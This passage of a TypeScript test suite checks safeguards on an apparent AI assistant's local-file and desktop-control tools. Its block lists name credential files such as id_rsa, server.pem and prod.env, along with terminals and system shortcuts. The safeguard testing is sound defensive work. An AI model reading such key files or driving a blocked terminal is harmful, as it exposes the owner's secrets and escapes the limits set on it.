      moves: [{ from: note, to: join(shared, 'note.sh') }],
    })) as { failed: Array<{ error: string }> };
    assert.match(renamed.failed[0]!.error, /program or shortcut/);
    await assert.rejects(
      files.execute('LOCAL_FILES_LIST', { path: `${shared}/sorted/..` }),
      /leads somewhere else/,
    );
    const stuck = join(shared, 'stuck.txt');
    await writeFile(stuck, 'old');
    await assert.rejects(
      files.execute('LOCAL_FILES_EDIT', {
        path: stuck,
        edits: [{ oldText: 'old', newText: 'new' }],
      }),
      /Trash failure/,
    );
    assert.equal(await readFile(stuck, 'utf8'), 'old');
    assert.deepEqual(
      (await readdir(shared)).filter((name) => name.startsWith('.nod-')),
      [],
    );
    await assert.rejects(
      files.execute('LOCAL_FILES_READ', { path: join(outside, 'missing.txt') }),
      /outside your home/,
    );
    const case_ = join(shared, 'Case.txt');
    await writeFile(join(shared, 'case.txt'), 'c');
    await files.execute('LOCAL_FILES_MOVE', {
      moves: [{ from: join(shared, 'case.txt'), to: case_ }],
    });
    assert.ok((await readdir(shared)).includes('Case.txt'));
    await mkdir(join(shared, 'box'));
    const folderMoves = (await files.execute('LOCAL_FILES_MOVE', {
      moves: [
        { from: join(shared, 'box'), to: join(shared, 'sorted') },
        { from: join(shared, 'box'), to: join(shared, 'crate') },
      ],
    })) as { moved: unknown[]; failed: Array<{ error: string }> };
    assert.match(folderMoves.failed[0]!.error, /already exists/);
    assert.equal(folderMoves.moved.length, 1);
    assert.ok(existsSync(join(shared, 'sorted', 'a.txt')));
    const installer = join(shared, 'install.sh');
    await writeFile(installer, 'echo hi');
    await mkdir(join(shared, 'Installers'));
    const kept = (await files.execute('LOCAL_FILES_MOVE', {
      moves: [{ from: installer, to: join(shared, 'Installers', 'install.sh') }],
    })) as { moved: unknown[] };
    assert.equal(kept.moved.length, 1);
    for (const name of ['id_rsa', 'server.pem', 'prod.env'])
      await writeFile(join(shared, name), 'synthetic secret');
    await mkdir(join(shared, 'Library'));
    for (const name of ['id_rsa', 'server.pem', 'prod.env', 'Library'])
      await assert.rejects(
        files.execute('LOCAL_FILES_READ', { path: join(shared, name) }),
        /secret/,
      );
    const sorted = join(shared, 'sorted');
    await files.keepOut(turn, ' ~/Downloads/sorted/ ', pool);
    assert.deepEqual(keep, [sorted]);
    const shown = (await files.execute('LOCAL_FILES_LIST', { path: shared })) as {
      entries: Array<{ name: string }>;
    };
    for (const name of ['sorted', 'id_rsa', 'server.pem', 'prod.env', 'Library'])
      assert.ok(!shown.entries.some((item) => item.name === name), name);
    const blocked = (await files.execute('LOCAL_FILES_MOVE', {
      moves: [
        { from: note, to: join(sorted, 'note.txt') },
        { from: join(sorted, 'a.txt'), to: join(shared, 'out.txt') },
      ],
    })) as { failed: Array<{ error: string }> };
    assert.equal(blocked.failed.length, 2);
    assert.match(blocked.failed[0]!.error, /keep out/);
    const beside = (await files.execute('LOCAL_FILES_MOVE', {
      moves: [{ from: note, to: join(shared, 'note-moved.txt') }],
    })) as { moved: unknown[] };
    assert.equal(beside.moved.length, 1);
    await files.execute('LOCAL_FILES_MOVE', {
      moves: [{ from: join(shared, 'note-moved.txt'), to: note }],
    });
    for (const [action, args] of [
      ['LOCAL_FILES_LIST', { path: join(sorted, '..', 'sorted') }],
      ['LOCAL_FILES_READ', { path: join(sorted, 'a.txt') }],
      ['LOCAL_FILES_CREATE_FOLDER', { path: join(sorted, 'new') }],
      ['LOCAL_FILES_EXPORT', { file, path: join(sorted, 'copy.pdf') }],
      ['LOCAL_FILES_TRASH', { paths: [shared] }],
    ] as const)
      await assert.rejects(files.prepare(action, args), /keep out/, action);
    assert.equal(
      (
        (await files.execute(
          'LOCAL_FILES_READ',
          await files.prepare('LOCAL_FILES_READ', { path: note }),
        )) as { text: string }
      ).text,
      '1 two two',
    );
    await files.keepOut(turn, join(shared, 'Later', 'New'), pool);
    assert.equal(keep.at(-1), join(shared, 'Later', 'New'));
    const replaced = (await files.execute('LOCAL_FILES_WRITE', {
      path: note,
      text: 'fresh',
      overwrite: true,
    })) as { previousVersion?: string };
    assert.equal(replaced.previousVersion, 'moved to the Trash');
    assert.equal(await readFile(note, 'utf8'), 'fresh');
    assert.equal(await readFile(join(trash, 'note.txt'), 'utf8'), '1 two two');
    const late = join(shared, 'late.txt');
    await writeFile(late, 'old');
    await assert.rejects(
      files.execute('LOCAL_FILES_EDIT', {
        path: late,
        edits: [{ oldText: 'old', newText: 'new' }],
      }),
      /is unchanged/,
    );
    assert.equal(await readFile(late, 'utf8'), 'old');
    assert.deepEqual(
      (await readdir(shared)).filter((name) => name.startsWith('.nod-')),
      [],
    );
    await writeFile(join(shared, 'tool.sh'), 'echo hi');
    const kinds = (await files.execute('LOCAL_FILES_MOVE', {
      moves: [{ from: join(shared, 'tool.sh'), to: join(shared, 'tool.bash') }],
    })) as { failed: Array<{ error: string }> };
    assert.match(kinds.failed[0]?.error ?? '', /program or shortcut/);
    await symlink('a-target.txt', join(shared, 'relative'));
    const relative = (await files.execute('LOCAL_FILES_MOVE', {
      moves: [
        { from: join(shared, 'relative'), to: join(shared, 'Installers', 'relative') },
        { from: join(shared, 'relative'), to: join(shared, 'renamed') },
      ],
    })) as { moved: unknown[]; failed: Array<{ error: string }> };
    assert.match(relative.failed[0]!.error, /relative link/);
    assert.equal(relative.moved.length, 1);
    const off = createLocalFiles(pool, 'owner', { dataRoot: data, home, available: false });
    await assert.rejects(off.prepare('LOCAL_FILES_LIST', { path: shared }), /desktop app/);
    await assert.rejects(off.execute('LOCAL_FILES_READ', { path: note }), /desktop app/);
  } finally {
    await rm(base, { recursive: true, force: true });
  }
});

test('computer use refuses blocked apps, keeps browsers view-only and acts only on refs Nod showed', async () => {
  for (const bundle of [
    'com.apple.Terminal',
    'com.googlecode.iterm2',
    'com.apple.finder',
    'com.apple.systempreferences',
    'com.1password.1password',
    'dev.nod.desktop',
  ])
    assert.equal(computerAppRule(bundle).kind, 'blocked', bundle);
  for (const bundle of ['com.google.Chrome', 'com.apple.Safari', 'com.microsoft.VSCode'])
    assert.equal(computerAppRule(bundle).kind, 'view', bundle);
  for (const bundle of [
    'C:\\Windows\\System32\\cmd.exe',
    'CMD.EXE',
    'powershell',
    'WindowsTerminal.exe',
    'explorer.exe',
    'regedit',
    'org.gnome.Terminal',
    'org.gnome.Nautilus.desktop',
    'gnome-control-center',
    'io.n8n.Nod',
  ])
    assert.equal(computerAppRule(bundle).kind, 'blocked', bundle);
  for (const bundle of ['msedge.exe', 'firefox', 'org.mozilla.firefox', 'code'])
    assert.equal(computerAppRule(bundle).kind, 'view', bundle);
  assert.equal(computerAppRule('notepad.exe').kind, 'use');
  assert.equal(computerAppRule('C:\\Apps\\Slack\\slack.exe', ['slack']).kind, 'blocked');
  for (const platform of ['win32', 'linux'])
    for (const keys of ['win+r', 'super+a', 'alt+tab', 'ctrl+esc', 'ctrl+alt+t', 'ctrl+alt+delete'])
      assert.equal(systemShortcut(keys, platform), true, `${platform} ${keys}`);
  assert.equal(systemShortcut('alt+tab', 'darwin'), false);
  assert.equal(systemShortcut('ctrl+alt+shift+t', 'linux'), true);
  assert.equal(systemShortcut('alt+print+b', 'linux'), true);
  assert.equal(systemShortcut('ctrl+shift+t', 'linux'), false);
  assert.equal(systemShortcut('ctrl+n', 'win32'), false);
  assert.equal(systemShortcut('cmd+n', 'darwin'), false);
  assert.equal(systemShortcut('cmd+cmd+space', 'darwin'), true);
  assert.equal(systemShortcut('ctrl+ctrl+up', 'darwin'), true);
  assert.equal(systemShortcut('c m d+space', 'darwin'), true);
  assert.equal(systemShortcut('cmd+shift+space', 'darwin'), true);
  assert.equal(systemShortcut('cmd+n', 'linux'), true);
  assert.equal(computerAppRule('com.apple.iWork.Numbers').kind, 'use');
  assert.equal(
    computerAppRule('com.apple.iWork.Numbers', ['com.apple.iWork.Numbers']).kind,
    'blocked',
  );

  let source = 'user';
  let proactive = false;
  let root = 'root-turn';
  const pool = {
    query: async (sql: string) => {
      if (sql.startsWith('SELECT computer_use'))
        return { rows: [{ computer_use: true, computer_keep_out: [] }] };
      if (sql.startsWith('WITH RECURSIVE'))
        return { rows: [{ id: root, source, message_id: 'message', proactive }] };
      assert.fail(`Unexpected query: ${sql}`);
    },
  } as unknown as Pool;
  const calls: Array<Record<string, unknown>> = [];
  const apps = [
    {
      pid: 11,
      bundle: 'com.apple.TextEdit',
      name: 'TextEdit',
      windows: [{ id: 'w-1', title: 'Draft' }],
    },
    {
      pid: 12,
      bundle: 'com.google.Chrome',
      name: 'Chrome',
      windows: [{ id: 'w-2', title: 'Inbox' }],
    },
    {
      pid: 13,
      bundle: 'com.apple.Terminal',
      name: 'Terminal',
      windows: [{ id: 'w-3', title: 'zsh' }],
    },
  ];
  const window: { role: string; name: string; children: Array<Record<string, unknown>> } = {
    role: 'window',
    name: 'Draft',
    children: [
      { role: 'button', name: 'Send', ref_id: '@sdraft01:e1', available_actions: ['Click'] },
      { role: 'textfield', name: 'Subject', value: 'Hi', ref_id: '@sdraft01:e2' },
      { role: 'textfield', ref_id: '@sdraft01:e3', states: ['secure', 'focused'], value: null },
      { role: 'securetextfield', name: 'PIN', ref_id: '@sdraft01:e4' },
      { role: 'textarea', name: 'Notes', ref_id: '@sdraft01:e5' },
      { role: 'textfield', ref_id: '@sdraft01:e6', value: '' },
      { role: 'textfield', ref_id: '@sdraft01:e7', value: '' },
    ],
  };
  const menuBar = {
    role: 'menu',
    children: [
      {
        role: 'menuitem',
        name: 'Apple',
        children: [{ role: 'menuitem', name: 'Restart…', ref_id: '@smenu001:e1' }],
      },
      {
        role: 'menuitem',
        name: 'TextEdit',
        children: [{ role: 'menuitem', name: 'Services', ref_id: '@smenu001:e3' }],
      },
      {
        role: 'menuitem',
        name: 'File',
        children: [{ role: 'menuitem', name: 'New', ref_id: '@smenu001:e2' }],
      },
    ],
  };
  const findings: Array<Record<string, unknown>> = [
    { role: 'textfield', name: 'Message to Ada', ref_id: '@sfind001:e1', value: '' },
    { role: 'textfield', name: 'Password', ref_id: '@sfind001:e2', states: ['secure'] },
  ];
  const computer = createComputerUse(pool, 'owner', {
    platform: 'darwin',
    desktop: {
      request: async (request) => {
        calls.push(request);
        if (request.op === 'apps') return { apps };
        if (request.op === 'locate') {
          const found = apps.find((app) => app.bundle === request.bundle);
          if (!found) throw new Error('No app with that bundle ID is installed.');
          return { bundle: found.bundle, name: found.name };
        }
        if (request.op === 'snapshot' && request.ref)
          return {
            tree: [
              ...window.children,
              ...findings,
              ...menuBar.children.flatMap((node) => node.children),
            ].find((node) => node.ref_id === request.ref),
          };
        if (request.op === 'inspect') {
          const tree = request.menu
            ? { ...menuBar, children: menuBar.children.slice(2) }
            : { ...window, children: [...window.children, ...findings] };
          return {
            tree,
            state: createHash('sha256').update(JSON.stringify(tree)).digest('hex'),
            focus: createHash('sha256').update('synthetic-focus').digest('hex'),
            focused: [],
            ...(request.menu ? { incomplete: true } : {}),
          };
        }
        if (request.op === 'snapshot')
          return {
            tree: request.menu
              ? menuBar
              : request.app === 'Chrome'
                ? {
                    role: 'window',
                    children: [{ role: 'button', name: 'Compose', ref_id: '@schrome1:e1' }],
                  }
                : window,
          };
        if (request.op === 'screenshot') return { image: 'synthetic' };
        if (request.op === 'find') return { matches: findings };
        if (request.text === 'cut off')
          throw new Error('ACTION_FAILED: the app stopped answering after the text arrived');
        if (request.op === 'type' || request.op === 'set_value') {
          const node = [...window.children, ...findings].find(
            (node) => node.ref_id === request.ref,
          )!;
          node.value = (request.op === 'type' ? String(node.value ?? '') : '') + request.text;
        }
        return { disposition: { delivery: 'delivered_verified' } };
      },
    },
  });
  const turn = { turnId: 'turn', threadId: 'thread' };

  source = 'event';
  await assert.rejects(computer.prepare(turn, 'COMPUTER_APPS', {}), /work the owner started/);
  source = 'user';
  proactive = true;
  await assert.rejects(
    computer.prepare(turn, 'COMPUTER_SNAPSHOT', { pid: 11 }),
    /work the owner started/,
  );
  proactive = false;
  assert.equal(calls.length, 0);

  await assert.rejects(
    computer.prepare(turn, 'COMPUTER_OPEN', { bundle: 'com.apple.Terminal' }),
    /never uses it/,
  );
  await assert.rejects(computer.prepare(turn, 'COMPUTER_SNAPSHOT', { pid: 11 }), /open \{bundle/);
  await assert.rejects(
    computer.prepare(turn, 'COMPUTER_PRESS', { ref: '@sdraft01:e1' }),
    /no snapshot with that ref/,
  );
  await computer.execute(
    turn,
    'COMPUTER_OPEN',
    await computer.prepare(turn, 'COMPUTER_OPEN', { bundle: 'com.apple.TextEdit' }),
  );
  assert.ok(!calls.some((call) => call.op === 'open'));
  const listed = (await computer.execute(turn, 'COMPUTER_APPS', {})) as {
    apps: Array<Record<string, unknown>>;
  };
  assert.deepEqual(
    listed.apps.find((app) => app.pid === 13),
    { pid: 13, bundle: 'com.apple.Terminal', name: 'Terminal', blocked: 'a terminal' },
  );
  assert.equal(listed.apps.find((app) => app.pid === 12)?.windows, undefined);

  const snapshot = (await computer.execute(
    turn,
    'COMPUTER_SNAPSHOT',
    await computer.prepare(turn, 'COMPUTER_SNAPSHOT', { pid: 11 }),
  )) as { tree: string };
  assert.match(snapshot.tree, /button "Send" @sdraft01:e1/);
  assert.match(snapshot.tree, /\[password, hidden\]/);
  assert.doesNotMatch(snapshot.tree, /@sdraft01:e3/);
  const menu = (await computer.execute(
    turn,
    'COMPUTER_SNAPSHOT',
    await computer.prepare(turn, 'COMPUTER_SNAPSHOT', { pid: 11, menu: true }),
  )) as { tree: string };
  assert.doesNotMatch(menu.tree, /Restart/);
  const windows = apps[0]!.windows;
  apps[0]!.windows = [];
  const firstDocument = await computer.prepare(turn, 'COMPUTER_PRESS', { ref: '@smenu001:e2' });
  assert.equal(firstDocument.windowBinding?.menu, true);
  assert.doesNotMatch(String(firstDocument.windowContext), /Restart|Services/);
  assert.equal(computer.checked('COMPUTER_PRESS', firstDocument).windowContextIncomplete, true);
  assert.deepEqual(calls.findLast((call) => call.op === 'inspect')?.control, {
    role: 'menuitem',
    name: 'New',
  });
  await computer.execute(turn, 'COMPUTER_PRESS', firstDocument);
  assert.equal(calls.at(-1)?.menu, true);
  apps[0]!.windows = windows;
  await assert.rejects(
    computer.prepare(turn, 'COMPUTER_PRESS', { ref: '@smenu001:e1' }),
    /no snapshot with that ref/,
  );
  await assert.rejects(
    computer.prepare(turn, 'COMPUTER_SET_VALUE', { ref: '@sdraft01:e3', text: 'x' }),
    /no snapshot with that ref/,
  );
  await assert.rejects(
    computer.execute(
      turn,
      'COMPUTER_SCREENSHOT',
      await computer.prepare(turn, 'COMPUTER_SCREENSHOT', { pid: 11 }),
    ),
    /password field has focus/,
  );

  findings.push({ role: 'statictext', name: 'x'.repeat(25_000) });
  await assert.rejects(
    computer.prepare(turn, 'COMPUTER_PRESS', { ref: '@sdraft01:e1' }),
    /size limit/,
  );
  findings.pop();
  const press = await computer.prepare(turn, 'COMPUTER_PRESS', { ref: '@sdraft01:e1' });
  assert.equal(computer.needsCheck('COMPUTER_PRESS', press), true);
  assert.deepEqual(computer.checked('COMPUTER_PRESS', press), {
    app: { bundle: 'com.apple.TextEdit', name: 'TextEdit' },
    control: { role: 'button', name: 'Send', window: 'Draft' },
    windowContext: press.windowContext,
    step: 'press',
  });
  await computer.execute(turn, 'COMPUTER_PRESS', press);
  assert.deepEqual(calls.at(-1), {
    op: 'press',
    ref: '@sdraft01:e1',
    app: 'TextEdit',
    role: 'button',
    control: { role: 'button', name: 'Send' },
    expected: press.windowBinding!.state,
    window: 'w-1',
  });
  const found = (await computer.execute(
    turn,
    'COMPUTER_FIND',
    await computer.prepare(turn, 'COMPUTER_FIND', { pid: 11, role: 'textfield' }),
  )) as { matches: string };
  assert.match(found.matches, /textfield "Message to Ada" @sfind001:e1/);
  assert.doesNotMatch(found.matches, /@sfind001:e2/);
  assert.deepEqual(calls.at(-1), { op: 'find', app: 'TextEdit', window: 'w-1', role: 'textfield' });
  await assert.rejects(
    computer.prepare(turn, 'COMPUTER_TYPE', { ref: '@sfind001:e2', text: 'x' }),
    /no snapshot with that ref/,
  );
  await computer.prepare(turn, 'COMPUTER_TYPE', { ref: '@sfind001:e1', text: 'Hi Ada' });
  const typed = await computer.prepare(turn, 'COMPUTER_SET_VALUE', {
    ref: '@sdraft01:e2',
    text: 'Hello',
  });
  assert.equal(computer.needsCheck('COMPUTER_SET_VALUE', typed), true);
  assert.equal(
    (computer.checked('COMPUTER_SET_VALUE', typed) as Record<string, unknown>).replacesText,
    true,
  );
  const filling = await computer.prepare(turn, 'COMPUTER_SET_VALUE', {
    ref: '@sfind001:e1',
    text: 'Hello',
  });
  assert.equal(computer.needsCheck('COMPUTER_SET_VALUE', filling), true);
  findings[0]!.value = 'Ada wrote this';
  await assert.rejects(
    computer.execute(turn, 'COMPUTER_SET_VALUE', filling),
    (error: Error & { notRun?: boolean }) =>
      error.notRun === true && /window changed/.test(error.message),
  );
  findings[0]!.value = '';
  const line = await computer.prepare(turn, 'COMPUTER_TYPE', {
    ref: '@sdraft01:e2',
    text: 'Hello\n',
  });
  assert.equal(computer.needsCheck('COMPUTER_TYPE', line), true);

  const subject = window.children[1]!;
  const intoSubject = await computer.prepare(turn, 'COMPUTER_TYPE', {
    ref: '@sdraft01:e2',
    text: 'Hi',
  });
  subject.states = ['secure'];
  await assert.rejects(
    computer.execute(turn, 'COMPUTER_TYPE', intoSubject),
    (error: Error & { notRun?: boolean }) =>
      error.notRun === true && /password fields/.test(error.message),
  );
  await assert.rejects(
    computer.prepare(turn, 'COMPUTER_SET_VALUE', { ref: '@sdraft01:e2', text: 'x' }),
    /password fields/,
  );
  delete subject.states;
  const before = calls.length;
  await assert.rejects(
    computer.execute(
      turn,
      'COMPUTER_KEY',
      await computer.prepare(turn, 'COMPUTER_KEY', { pid: 11, keys: 'cmd+v' }),
    ),
    (error: Error & { notRun?: boolean }) =>
      error.notRun === true && /sent no keys/.test(error.message),
  );
  assert.ok(!calls.slice(before).some((call) => call.op === 'key'));

  await computer.execute(
    turn,
    'COMPUTER_TYPE',
    await computer.prepare(turn, 'COMPUTER_TYPE', {
      ref: '@sfind001:e1',
      text: 'Ada, see you at 10',
    }),
  );
  const send = await computer.prepare(turn, 'COMPUTER_PRESS', { ref: '@sdraft01:e1' });
  assert.match(
    String(computer.checked('COMPUTER_PRESS', send).windowContext),
    /Ada, see you at 10/,
  );
  await computer.execute(
    turn,
    'COMPUTER_TYPE',
    await computer.prepare(turn, 'COMPUTER_TYPE', { ref: '@sfind001:e1', text: ' and bring Bo' }),
  );
  await assert.rejects(
    computer.execute(turn, 'COMPUTER_PRESS', send),
    (error: Error & { notRun?: boolean }) =>
      error.notRun === true && /window changed/.test(error.message),
  );
  await assert.rejects(
    computer.execute(
      turn,
      'COMPUTER_TYPE',
      await computer.prepare(turn, 'COMPUTER_TYPE', { ref: '@sdraft01:e2', text: 'cut off' }),
    ),
    /stopped answering/,
  );
  const body = findings[0]!;
  body.value = 'a'.repeat(2500);
  const longSend = await computer.prepare(turn, 'COMPUTER_PRESS', { ref: '@sdraft01:e1' });
  assert.match(String(computer.checked('COMPUTER_PRESS', longSend).windowContext), /a{2500}/);
  body.value += ' Changed after approval';
  await assert.rejects(computer.execute(turn, 'COMPUTER_PRESS', longSend), /window changed/);
  body.value = 'b'.repeat(24_001);
  await assert.rejects(
    computer.prepare(turn, 'COMPUTER_PRESS', { ref: '@sdraft01:e1' }),
    /complete window/,
  );
  body.value = 'Current message';
  const recipient = window.children[5]!;
  recipient.value = 'ana@example.test';
  const addressed = await computer.prepare(turn, 'COMPUTER_PRESS', { ref: '@sdraft01:e1' });
  assert.match(
    String(computer.checked('COMPUTER_PRESS', addressed).windowContext),
    /ana@example.test/,
  );
  recipient.value = 'bo@example.test';
  await assert.rejects(computer.execute(turn, 'COMPUTER_PRESS', addressed), /window changed/);
  const replacing = await computer.prepare(turn, 'COMPUTER_TYPE', {
    ref: '@sfind001:e1',
    text: 'Replacement',
  });
  assert.equal(computer.needsCheck('COMPUTER_TYPE', replacing), true);
  assert.equal(replacing.replacesText, true);
  const renamed = await computer.prepare(turn, 'COMPUTER_PRESS', { ref: '@sdraft01:e1' });
  window.children[0]!.name = 'Delete';
  await assert.rejects(computer.execute(turn, 'COMPUTER_PRESS', renamed), /control changed/);
  window.children[0]!.name = 'Send';
  findings[0]!.role = 'group';
  await assert.rejects(
    computer.prepare(turn, 'COMPUTER_TYPE', { ref: '@sfind001:e1', text: 'Hi' }),
    (error: Error & { notRun?: boolean }) => /control changed/.test(error.message),
  );
  findings[0]!.role = 'textfield';

  await computer.execute(
    turn,
    'COMPUTER_OPEN',
    await computer.prepare(turn, 'COMPUTER_OPEN', { bundle: 'com.google.Chrome' }),
  );
  await computer.execute(
    turn,
    'COMPUTER_SNAPSHOT',
    await computer.prepare(turn, 'COMPUTER_SNAPSHOT', { pid: 12 }),
  );
  await assert.rejects(
    computer.prepare(turn, 'COMPUTER_KEY', { pid: 12, keys: 'cmd+n' }),
    /can only look at it/,
  );

  assert.doesNotMatch(menu.tree, /Services/);
  await assert.rejects(
    computer.prepare(turn, 'COMPUTER_SNAPSHOT', { pid: 11, ref: '@smenu001:e3' }),
    /no snapshot with that ref/,
  );
  assert.doesNotMatch(snapshot.tree, /@sdraft01:e4/);
  await assert.rejects(
    computer.prepare(turn, 'COMPUTER_KEY', { pid: 11, keys: 'Command+Space' }),
    /system shortcut/,
  );
  await assert.rejects(
    computer.prepare(turn, 'COMPUTER_KEY', { pid: 11, keys: 'cmd+opt+escape' }),
    /system shortcut/,
  );
  const chromeSnapshot = (await computer.execute(
    turn,
    'COMPUTER_SNAPSHOT',
    await computer.prepare(turn, 'COMPUTER_SNAPSHOT', { pid: 12 }),
  )) as { tree: string };
  const chromeRef = chromeSnapshot.tree.match(/(@[a-z0-9]+:e\d+)/)![1]!;
  await assert.rejects(
    computer.prepare(turn, 'COMPUTER_SNAPSHOT', { pid: 11, ref: chromeRef }),
    /not part of TextEdit/,
  );
  const pressed = await computer.prepare(turn, 'COMPUTER_PRESS', { ref: '@sdraft01:e1' });
  root = 'other-root';
  await assert.rejects(
    computer.execute(turn, 'COMPUTER_PRESS', pressed),
    (error: Error & { notRun?: boolean }) => error.notRun === true,
  );
  await assert.rejects(
    computer.prepare(turn, 'COMPUTER_SNAPSHOT', { pid: 11 }),
    /hasn't opened TextEdit/,
  );
  await assert.rejects(
    computer.prepare(turn, 'COMPUTER_PRESS', { ref: '@sdraft01:e1' }),
    /no snapshot with that ref/,
  );
});

test('turning computer use off cancels input waiting on a read, even if that read ignores cancellation', async () => {
  let enabled = true;
  const pool = {
    query: async (sql: string, values: unknown[] = []) => {
      if (sql.startsWith('SELECT computer_use'))
        return { rows: [{ computer_use: enabled, computer_keep_out: [] }] };
      if (sql.startsWith('WITH RECURSIVE'))
        return { rows: [{ id: 'root', source: 'user', message_id: 'message', proactive: false }] };
      if (sql.includes('INSERT INTO preferences')) {
        enabled = Boolean(values[1]);
        return { rows: [] };
      }
      assert.fail(`Unexpected query: ${sql}`);
    },
  } as unknown as Pool;
  const app = {
    pid: 11,
    bundle: 'com.example.Notes',
    name: 'Notes',
    windows: [{ id: 'w-1', title: 'Notes' }],
  };
  const node = { role: 'textfield', name: 'Notes', value: '', ref_id: '@snotes01:e1' };
  let hold = false;
  let release!: () => void;
  let entered!: () => void;
  const waiting = new Promise<void>((resolve) => {
    entered = resolve;
  });
  const gate = new Promise<void>((resolve) => {
    release = resolve;
  });
  const calls: string[] = [];
  const computer = createComputerUse(pool, 'owner', {
    platform: 'darwin',
    desktop: {
      request: async (request) => {
        calls.push(request.op);
        if (request.op === 'apps') return { apps: [app] };
        if (request.op === 'inspect')
          return {
            tree: node,
            state: createHash('sha256').update(JSON.stringify(node)).digest('hex'),
          };
        if (request.op === 'snapshot') {
          if (hold && request.ref) {
            entered();
            await gate;
          }
          return { tree: node };
        }
        return {};
      },
    },
  });
  const server = Fastify();
  computer.registerRoutes(server);
  const turn = { turnId: 'turn', threadId: 'thread' };
  try {
    await computer.execute(
      turn,
      'COMPUTER_OPEN',
      await computer.prepare(turn, 'COMPUTER_OPEN', { bundle: app.bundle }),
    );
    await computer.execute(
      turn,
      'COMPUTER_SNAPSHOT',
      await computer.prepare(turn, 'COMPUTER_SNAPSHOT', { pid: app.pid }),
    );
    const prepared = await computer.prepare(turn, 'COMPUTER_SET_VALUE', {
      ref: node.ref_id,
      text: 'New note',
    });
    hold = true;
    const pending = computer.execute(turn, 'COMPUTER_SET_VALUE', prepared);
    const rejected = assert.rejects(pending, /Computer use was turned off/);
    await waiting;
    const response = await server.inject({
      method: 'PATCH',
      url: '/api/computer-use',
      payload: { enabled: false },
    });
    assert.equal(response.statusCode, 200);
    release();
    await rejected;
    assert.ok(calls.includes('cancel'));
    assert.ok(!calls.includes('set_value'));
    await server.inject({ method: 'PATCH', url: '/api/computer-use', payload: { enabled: true } });
    await assert.rejects(
      computer.execute(turn, 'COMPUTER_SET_VALUE', prepared),
      /no snapshot with that ref/,
    );
  } finally {
    release();
    await server.close();
  }
});

test('computer use on Windows keeps an opened app granted however the app list names it, and refuses apps it cannot identify', async () => {
  const pool = {
    query: async (sql: string) => {
      if (sql.startsWith('SELECT computer_use'))
        return { rows: [{ computer_use: true, computer_keep_out: [] }] };
      if (sql.startsWith('WITH RECURSIVE'))
        return {
          rows: [{ id: 'root-turn', source: 'user', message_id: 'message', proactive: false }],
        };
      assert.fail(`Unexpected query: ${sql}`);
    },
  } as unknown as Pool;
  const apps: Array<Record<string, unknown>> = [
    { pid: 31, bundle: '', name: 'Terminal', windows: [{ id: 'w-31', title: 'Terminal' }] },
    {
      pid: 32,
      bundle: 'Command Prompt',
      program: 'cmd.exe',
      name: 'Command Prompt',
      windows: [{ id: 'w-32', title: 'Command Prompt' }],
    },
  ];
  const computer = createComputerUse(pool, 'owner', {
    platform: 'win32',
    desktop: {
      request: async (request) => {
        if (request.op === 'apps') return { apps };
        if (request.op === 'locate')
          return { bundle: 'notepad.exe', name: 'notepad', program: 'notepad.exe' };
        if (request.op === 'open') {
          apps.push({
            pid: 33,
            bundle: 'Notepad.exe',
            program: 'Notepad.exe',
            name: 'Notepad.exe',
            windows: [{ id: 'w-33', title: 'Untitled - Notepad' }],
          });
          return { pid: 33 };
        }
        if (request.op === 'snapshot')
          return { tree: { role: 'window', name: 'Untitled - Notepad', children: [] } };
        throw new Error(`Unexpected ${request.op}`);
      },
    },
  });
  const turn = { turnId: 'turn', threadId: 'thread' };
  await computer.execute(
    turn,
    'COMPUTER_OPEN',
    await computer.prepare(turn, 'COMPUTER_OPEN', { bundle: 'notepad' }),
  );
  const snapshot = (await computer.execute(
    turn,
    'COMPUTER_SNAPSHOT',
    await computer.prepare(turn, 'COMPUTER_SNAPSHOT', { pid: 33 }),
  )) as { tree: string };
  assert.match(snapshot.tree, /Untitled - Notepad/);
  const listed = (await computer.execute(
    turn,
    'COMPUTER_APPS',
    await computer.prepare(turn, 'COMPUTER_APPS', {}),
  )) as { apps: Array<{ pid: number; blocked?: string; opened?: boolean }> };
  assert.match(listed.apps.find((app) => app.pid === 31)?.blocked ?? '', /can’t identify/);
  assert.match(listed.apps.find((app) => app.pid === 32)?.blocked ?? '', /terminal/);
  assert.equal(listed.apps.find((app) => app.pid === 33)?.opened, true);
  apps.push({ pid: 34, bundle: '', program: 'gjs', name: 'gnome-maps', windows: [] });
  assert.equal(
    (
      (await computer.execute(
        turn,
        'COMPUTER_APPS',
        await computer.prepare(turn, 'COMPUTER_APPS', {}),
      )) as { apps: Array<{ pid: number; opened?: boolean }> }
    ).apps.find((app) => app.pid === 34)?.opened,
    false,
  );
  await assert.rejects(
    computer.prepare(turn, 'COMPUTER_OPEN', { bundle: 'Command Prompt' }),
    /terminal/,
  );
});

test('computer use on Linux grants only the opened process when the app list has no desktop ID', async () => {
  const pool = {
    query: async (sql: string) => {
      if (sql.startsWith('SELECT computer_use'))
        return { rows: [{ computer_use: true, computer_keep_out: [] }] };
      if (sql.startsWith('WITH RECURSIVE'))
        return {
          rows: [
            {
              id: 'root-turn',
              parent_turn_id: null,
              source: 'user',
              message_id: 'message',
              proactive: false,
            },
          ],
        };
      assert.fail(`Unexpected query: ${sql}`);
    },
  } as unknown as Pool;
  const apps: Array<Record<string, unknown>> = [
    {
      pid: 42,
      bundle: '',
      program: 'gjs',
      name: 'gnome-maps',
      windows: [{ id: 'w-42', title: 'Maps' }],
    },
  ];
  const computer = createComputerUse(pool, 'owner', {
    platform: 'linux',
    desktop: {
      request: async (request) => {
        if (request.op === 'apps') return { apps };
        if (request.op === 'locate')
          return { bundle: 'org.gnome.Weather', name: 'Weather', program: 'gjs' };
        if (request.op === 'open') {
          apps.push({
            pid: 41,
            bundle: '',
            program: 'gjs',
            name: 'gnome-weather',
            windows: [{ id: 'w-41', title: 'Weather' }],
          });
          return { pid: 41 };
        }
        if (request.op === 'snapshot')
          return { tree: { role: 'window', name: 'Weather', children: [] } };
        throw new Error(`Unexpected ${request.op}`);
      },
    },
  });
  const turn = { turnId: 'turn', threadId: 'thread' };
  await computer.execute(
    turn,
    'COMPUTER_OPEN',
    await computer.prepare(turn, 'COMPUTER_OPEN', { bundle: 'org.gnome.Weather' }),
  );
  await computer.execute(
    turn,
    'COMPUTER_SNAPSHOT',
    await computer.prepare(turn, 'COMPUTER_SNAPSHOT', { pid: 41 }),
  );
  await assert.rejects(
    computer.prepare(turn, 'COMPUTER_SNAPSHOT', { pid: 42 }),
    /hasn't opened gnome-maps/,
  );
});

if (process.env.NOD_TEST_WORKSPACE_IMAGE)
  test(
    'workspace egress through native helpers ignores user startup and PATH hooks',
    { timeout: 30_000 },
    async (t) => {
      const container = `nod-workspace-helper-${randomUUID().slice(0, 8)}`;
      const threadId = randomUUID();
